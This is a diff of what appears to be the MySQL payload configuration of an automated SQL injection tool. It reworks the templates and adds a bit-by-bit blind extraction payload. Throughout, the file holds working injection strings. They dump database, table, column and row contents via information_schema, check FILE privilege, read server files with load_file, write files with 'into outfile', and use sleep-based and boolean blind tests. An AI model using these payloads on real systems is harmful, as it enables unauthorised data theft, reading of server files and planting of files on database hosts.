@@ -2,32 +2,23 @@ vendor: MySQL
 
 resource:
  info: |
-   concat(
-       concat_ws(
-           ${enclose_value_hex},
-           version(),
-           database(),
-           user()
-       ),
-       ${trail_hex}
-   )
+  concat_ws(
+      ${enclose_value_hex},
+      version(),
+      database(),
+      user()
+  )
 
  schema:
   database: |
-   select concat(
-       ifnull(
-           group_concat(
-               ${enclose_value_hex},
-               r,
-               ${separator_qte_hex},
-               q,
-               ${enclose_value_hex}
-               order by r
-               separator ${separator_cell_hex}
-           ),
-           ${trail_hex}
-       ),
-       ${trail_hex}
+   select group_concat(
+       ${enclose_value_hex},
+       r,
+       ${separator_qte_hex},
+       q,
+       ${enclose_value_hex}
+       order by r
+       separator ${separator_cell_hex}
    ) from (
        select
            cast(SCHEMA_NAME as char) r,
@@ -42,17 +33,14 @@ resource:
    ) x
 
   table: |
-   select concat(
-       group_concat(
-           ${enclose_value_hex},
-           r,
-           ${separator_qte_hex},
-           q,
-           ${enclose_value_hex}
-           order by r
-           separator ${separator_cell_hex}
-       ),
-       ${trail_hex}
+   select group_concat(
+       ${enclose_value_hex},
+       r,
+       ${separator_qte_hex},
+       q,
+       ${enclose_value_hex}
+       order by r
+       separator ${separator_cell_hex}
    ) from (
        select
            cast(TABLE_NAME as char) r,
@@ -65,17 +53,14 @@ resource:
    ) x
 
   column: |
-   select concat(
-       group_concat(
-           ${enclose_value_hex},
-           n,
-           ${separator_qte_hex},
-           0,
-           ${enclose_value_hex}
-           order by n
-           separator ${separator_cell_hex}
-       ),
-       ${trail_hex}
+   select group_concat(
+       ${enclose_value_hex},
+       n,
+       ${separator_qte_hex},
+       0,
+       ${enclose_value_hex}
+       order by n
+       separator ${separator_cell_hex}
    ) from (
        select cast(COLUMN_NAME as char) n
        from information_schema.columns
@@ -88,17 +73,14 @@ resource:
 
   row:
    query: |
-    select concat(
-        group_concat(
-            ${enclose_value_hex},
-            r,
-            ${separator_qte_hex},
-            q,
-            ${enclose_value_hex}
-            order by r
-            separator ${separator_cell_hex}
-        ),
-        ${trail_hex}
+    select group_concat(
+        ${enclose_value_hex},
+        r,
+        ${separator_qte_hex},
+        q,
+        ${enclose_value_hex}
+        order by r
+        separator ${separator_cell_hex}
     ) from (
         select
             cast(concat(${fields}) as char) r,
@@ -115,38 +97,29 @@ resource:
 
  zip:
   database: |
-   select concat(
-       group_concat(
-           ${enclose_value_hex},
-           SCHEMA_NAME,
-           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
-       ),
-       '${trail_sql}'
+   select group_concat(
+       ${enclose_value_hex},
+       SCHEMA_NAME,
+       '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
    )
    from INFORMATION_SCHEMA.schemata
    ${limit}
 
   table: |
-   select concat(
-       group_concat(
-           ${enclose_value_hex},
-           TABLE_NAME,
-           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
-       ),
-       '${trail_sql}'
+   select group_concat(
+       ${enclose_value_hex},
+       TABLE_NAME,
+       '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
    )
    from information_schema.tables
    where TABLE_SCHEMA = '${database}'
    ${limit}
 
   column: |
-   select concat(
-       group_concat(
-           ${enclose_value_hex},
-           COLUMN_NAME,
-           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
-       ),
-       '${trail_sql}'
+   select group_concat(
+       ${enclose_value_hex},
+       COLUMN_NAME,
+       '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
    )
    from information_schema.columns
    where TABLE_SCHEMA = '${database}'
@@ -155,13 +128,10 @@ resource:
 
   row:
    query: |
-    select concat(
-        group_concat(
-            ${enclose_value_hex},
-            concat(${fields}),
-            '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
-        ),
-        '${trail_sql}'
+    select group_concat(
+        ${enclose_value_hex},
+        concat(${fields}),
+        '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
     )
     from ${database}.${table}
     ${limit}
@@ -219,19 +189,13 @@ resource:
 
  file:
   privilege: |
-   cast(
-       concat(
-           (
-               select if(count(*) = 1, 0x74727565, 0x66616c7365)
-               from INFORMATION_SCHEMA.USER_PRIVILEGES
-               where grantee = concat(0x27, replace(cast(current_user as char), 0x40, 0x274027), 0x27)
-               and PRIVILEGE_TYPE = 0x46494c45
-           ),
-           ${trail_hex}
-       )
-       as char
-   )
-  read: cast(concat(load_file(0x${filepath.hex}), ${trail_hex}) as char)
+   cast((
+       select if(count(*) = 1, 0x74727565, 0x66616c7365)
+       from INFORMATION_SCHEMA.USER_PRIVILEGES
+       where grantee = concat(0x27, replace(cast(current_user as char), 0x40, 0x274027), 0x27)
+       and PRIVILEGE_TYPE = 0x46494c45
+   ) as char)
+  read: cast(load_file(0x${filepath.hex}) as char)
   create:
    content: (select 0x${content.hex})
    query: into outfile '${filepath}'
@@ -239,17 +203,18 @@ resource:
 strategy:
  configuration:
   slidingWindow: |
-   (
-       select
-           concat(
-               ${lead_hex},
-               mid(
-                   (${injection}),
-                   ${window.char},
-                   ${capacity}
-               )
-           )
-   )
+   (select concat(
+       ${lead_hex},
+       ifnull(
+           mid(
+               (${injection}),
+               ${window.char},
+               ${capacity}
+           ),
+           ''
+       ),
+       ${trail_hex}
+   ))
   limit: limit ${limit.value}, 65536
   failsafe: 1337${indice}7330%2b1
   calibrator: repeat(${calibrator_hex}, 65536)
@@ -294,7 +259,6 @@ strategy:
         )
     )
     %26 ${bit}
-   length: char_length(${injection}) > ${window.char}
   modeAnd: and
   modeOr: or
   modeStacked: ; select 'stacked' where
@@ -304,6 +268,16 @@ strategy:
        ${test},
        1,
        sleep(${sleep_time})
+   )
+  multibit: |
+   '0'|conv(
+       mid(
+           lpad(bin(ascii(
+               substring(${injection}, ${window.char}, 1)
+           )), 8, '0'),
+           ${multibit.block}, 3
+       ),
+       2, 10
    )
 
  error:
